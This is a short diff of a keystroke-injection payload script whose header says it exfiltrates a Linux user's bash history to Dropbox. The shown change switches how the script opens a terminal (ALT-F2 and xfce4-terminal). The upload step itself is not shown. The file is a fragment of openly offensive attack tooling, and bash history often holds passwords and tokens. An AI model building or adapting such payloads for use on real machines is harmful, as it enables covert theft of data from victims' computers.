@@ -4,9 +4,9 @@ REM Description: This payload is meant to exfiltrate bash history to a dropbox
 REM Target: Linux
 
 DELAY 500
-INJECT_MOD WINDOWS
+ALT-F2
 DELAY 500
-STRING terminal
+STRING xfce4-terminal
 DELAY 500
 ENTER
 DELAY 500
